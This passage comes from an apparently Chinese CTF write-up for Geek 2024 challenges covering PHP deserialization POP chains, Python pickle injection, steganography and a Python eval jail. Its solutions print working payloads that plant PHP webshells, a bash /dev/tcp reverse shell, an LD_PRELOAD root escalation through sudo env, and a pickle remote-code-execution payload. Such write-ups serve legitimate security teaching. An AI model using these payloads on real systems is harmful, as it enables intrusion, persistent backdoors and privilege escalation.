class="variable">$Starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span>=<span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span>=<span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>简单分析后我们发现:</p><ul><li>反序列化的起始点在GEEK类</li><li>使用的是php8的新魔术方法</li><li><code>$data</code>数组中的元素是GEEK类的属性</li><li><code>change</code>参数是我们自己传的,可以使用任意魔术方法</li><li><code>$FUNC</code>触发时无法传参,联想到可变函数发数组调用</li></ul><p>于是构造POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Challenge</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;file = <span class="string">&#x27;secret.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">array</span>(<span class="variable">$s</span>,<span class="string">&quot;Sink&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>同时传参<code>?change=reset</code>取<code>$data</code>数组的首个元素赋值给<code>$FUNC</code><br>直接调用<code>Challenge类</code>的<code>Sink</code>获得假flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The True Flag is in /flag</span><br></pre></td></tr></table></figure><p>那么我们只能再利用<code>Syclover类</code>试图读取&#x2F;flag<br>有趣的是<code>__toString</code>魔术方法也可以使用可变函数的数组调用直接触发<br>参数<code>where</code>是一个类，这里联想到php原生类的利用</p><p>于是构造POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Syclover</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;Where = <span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;IS = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Starven = <span class="string">&#x27;fpassthru&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Girlfriend = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">array</span>(<span class="variable">$s</span>,<span class="string">&quot;__toString&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><del>可以看到Starven学长没有Girlfriend</del><br>反序列化之后&#x2F;flag并没有被读取，明明本地测试成功的，怎么回事呢?<br>猜测要提权,要提权先得getshell<br>利用另一个原生类实现<br>由于直接使用shell非常难受，直接在当前网页写个马:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Syclover</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;Where = <span class="string">&#x27;ReflectionFunction&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;IS = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Starven = <span class="string">&#x27;invoke&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Girlfriend = <span class="string">&#x27;echo &quot;echo 123;eval(\$_POST[\&#x27;cmd\&#x27;]);&quot;&gt;&gt;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">array</span>(<span class="variable">$s</span>,<span class="string">&quot;__toString&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>使用命令:<code>find / -perm -u=s -type f 2&gt;/dev/null</code><br>列出所有可使用的有root权限的命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/file</span><br></pre></td></tr></table></figure><p>看这个file有能读文件的意思。。<br>一番搜索后使用:<code>file -f /flag</code><br>成功通过报错的方式读取<code>/flag</code>文件里的内容,成功获得flag</p><h1 id="not-just-pop"><a href="#not-just-pop" class="headerlink" title="not_just_pop"></a>not_just_pop</h1><p>上来是一个pop链:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;web);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web=<span class="variable language_">$this</span>-&gt;love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;You-&gt;execurise=<span class="variable language_">$this</span>-&gt;Do);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$execurise</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;/flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;还想直接读flag，洗洗睡吧，rce去&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;execurise==<span class="string">&quot;man!&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;居然没坠机&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hansome-&gt;lover))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;execurise);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你也想被肘吗&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;试试所想的呗，说不定成功了&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;girl-&gt;abc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;friend;</span><br><span class="line">        <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$Syclover</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;Syclover&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$Syclover</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Syclover</span>));</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;怎么不给我呢，是不喜欢吗？&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析发现:</p><ul><li>序列化字符串使用base64加密</li><li>漏洞点在<code>lhRaMK7</code>的<code>__invoke()</code></li><li><code>is_readable(&quot;/flag&quot;)</code>目测不可读，所以后续需要提权</li></ul><p>倒推可得POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend=<span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend-&gt;love = <span class="string">&quot;file_put_contents(&#x27;a.php&#x27;,&#x27;&lt;?php highlight_file(__FILE__);@eval(\$_POST[1]);?&gt;&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>使用<code>phpinfo()</code>发现php版本为7.2<br>直接使用<code>system()</code>函数发现居然有disable_function<br>于是一个一个试发现<code>file_put_contents()</code>可用,且当前目录可写<br>所以直接写马，上马后使用php版本漏洞绕过disable_function,直接执行命令<br>详见<a href="https://www.youncyb.cn/?p=625#Bypass-disable_functions">文章</a><br>执行<code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</code>回弹shell<br>接收后使用<code>perl -e &#39;exec &quot;/bin/sh&quot;;&#39;</code>升交互式<br>一番检查:<br><img src="/2025/03/07/geek2024/shell.png"><br>sudo可以使用<br>看一眼env,发现:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HINT=why_not_trytry_sudo</span><br></pre></td></tr></table></figure><p>使用<code>sudo -l</code>搜索可用指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User www-data may run the following commands on</span><br><span class="line">        dep-0790f3fc-174e-4e43-a484-b6d3615adf07-59c798cd59-nb5c6:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/envUser www-data may run the following commands on</span><br><span class="line">        dep-0790f3fc-174e-4e43-a484-b6d3615adf07-59c798cd59-nb5c6:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/env</span><br></pre></td></tr></table></figure><p>env能用，我寻思env有啥用啊，但是gpt告诉我确实有用:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -o /tmp/preload.so preload.c</span><br><span class="line">sudo env LD_PRELOAD=/tmp/preload.so /bin/bash</span><br></pre></td></tr></table></figure><p>直接拿下一个root终端,简直crazy<br>直接<code>cat /flag</code><br>获得:<code>SYC&#123;f2e3cce2-5c9c-4876-b7c4-cbb140ebbfd0&#125;</code></p><h1 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h1><p>常规注册登录，暂时没有发现可攻击的点<br>但登录后提示查看:<code>/starven_s3cret</code><br>成功获得源码:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, make_response, render_template, send_file</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> black</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#To Ctfer：给你源码只是给你漏洞点的hint，怎么绕？black.py黑盒，唉无意义</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(<span class="string">&#x27;templates/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        usname = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        passwd = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> usname <span class="keyword">and</span> passwd:</span><br><span class="line">            heart_cookie = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">            response = make_response(<span class="string">f&quot;Registered successfully with username: <span class="subst">&#123;usname&#125;</span> &lt;br&gt; Now you can go to /login to heal starven&#x27;s heart&quot;</span>)</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;heart&#x27;</span>, heart_cookie)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    heart_cookie = request.cookies.get(<span class="string">&#x27;heart&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> heart_cookie:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;warning.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.cookies.get(<span class="string">&#x27;heart&#x27;</span>) == heart_cookie:</span><br><span class="line">        statement = request.form[<span class="string">&#x27;statement&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            heal_state = base64.b64decode(statement)</span><br><span class="line">            <span class="built_in">print</span>(heal_state)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black.blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> heal_state:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;waf.html&#x27;</span>)</span><br><span class="line">            pickle.loads(heal_state)</span><br><span class="line">            res = make_response(<span class="string">f&quot;Congratulations! You accomplished the first step of healing Starven&#x27;s broken heart!&quot;</span>)</span><br><span class="line">            flag = os.getenv(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">or</span> os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">            os.system(<span class="string">&quot;echo &quot;</span> + flag + <span class="string">&quot; &gt; /flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>( e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error!!!! give you hint: maybe you can view /starven_s3cret&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/monologue&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">joker</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;joker.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/starven_s3cret&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>可见是一个pickle注入题目<br>而登录时对starven学长说的话就是需要注入的内容,需要base64加密<br>那么构造如下poc:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(<span class="string">&quot;111&quot;</span>)))</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">aaa</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">111</span>)</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;xxx&#x27;)&quot;</span>,))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">a = aaa()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br><span class="line"></span><br><span class="line">pickle.loads(base64.b64decode(<span class="string">&quot;gASVOQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCFlY2hvICIyMjIiPiBmaW5kIC1uYW1lIGpva2VyLmh0bWyUhZRSlC4=&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即可执行任意命令，本想弹shell，结果弹shell的各种方法被过滤，<br>另寻他法后发现index.html的文件位置精确的暴露了，那么我们只要将执行命令的回显写入即可:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;env &gt; templates/index.html&#x27;)&quot;</span>,))</span><br></pre></td></tr></table></figure><p>再回到首页即可成功获得flag</p><h1 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a>Truth of Word</h1><p>word文档的真相<br>点进word文档,发现有透明字符，调成红色<br><img src="/2025/03/07/geek2024/word.png"><br>发现外面多了个welcome_TO文件<br>同时文件一直提示要修复，怀疑文件结构里塞东西了<br>翻找发现<code>challenge\word\media</code>下有flag03<br><img src="/2025/03/07/geek2024/flag03.png"><br>最后打开宏代码，找到了flag02<br><img src="/2025/03/07/geek2024/flag02.png"></p><h1 id="雪"><a href="#雪" class="headerlink" title="雪"></a>雪</h1><p>snow隐写<br>上来一个压缩包打不开<br>用记事本在末尾发现一串base64:<code>VzNMQzBNNA==</code><br>解密得:<code>W3LC0M4</code>，作为密码输入成功解压<br>看到一个white.txt文件,显然是now隐写<br>没有密码,但是还有一个盲水印图片<br>使用网上找来的工具解盲水印得到密码:<code>Th1si4st8eK3y</code><br>执行:<br><code>snow.exe -p Th1si4st8eK3y -C White.txt</code><br>成功解密</p><h1 id="doSomeMath"><a href="#doSomeMath" class="headerlink" title="doSomeMath"></a>doSomeMath</h1><p>题目:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">white_List=[<span class="string">&quot;+&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;,&quot;</span>]</span><br><span class="line">flag=os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">if</span> os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>)!=<span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;SYC&#123;test&#125;&quot;</span></span><br><span class="line">banner=<span class="string">&#x27;&#x27;&#x27;     _      ____                       __  __       _   _</span></span><br><span class="line"><span class="string">  __| | ___/ ___|  ___  _ __ ___   ___|  \/  | __ _| |_| |__</span></span><br><span class="line"><span class="string"> / _` |/ _ \___ \ / _ \| &#x27;_ ` _ \ / _ \ |\/| |/ _` | __| &#x27;_ \\</span></span><br><span class="line"><span class="string">| (_| | (_) |__) | (_) | | | | | |  __/ |  | | (_| | |_| | | |</span></span><br><span class="line"><span class="string"> \__,_|\___/____/ \___/|_| |_| |_|\___|_|  |_|\__,_|\__|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.isascii():</span><br><span class="line">        exit(<span class="string">&quot;Please input ascii&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> white_List:</span><br><span class="line">            exit(<span class="string">&quot;hacker!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;please do this math problem&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">input</span>(<span class="string">&quot;99*100^60= &quot;</span>)</span><br><span class="line">        waf(result)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">99</span> * <span class="number">100</span> ^ <span class="number">60</span> == <span class="built_in">eval</span>(result):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congradulation!!!!! Here is your reward: &quot;</span> + flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not right&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br></pre></td></tr></table></figure><p>考python原生类魔术方法的使用<br>发现只有gelt四个英文字符可以使用,那么很容易就可以发现:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__le__(())</span><br></pre></td></tr></table></figure><p>可以得到1<br>那么两个加起来就是二，再做平方操作很容易就可以获得任何数，最终payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(().__le__(()) + ().__le__(()))**13 + (().__le__(()) + ().__le__(()))**10+ (().__le__(()) + ().__le__(()))**9+ (().__le__(()) + ().__le__(()))**7+ (().__le__(()) + ().__le__(()))**4</span><br></pre></td></tr></table></figure><p>得到9872,提交即可</p><h1 id="I-wanna-go-to-SYC"><a 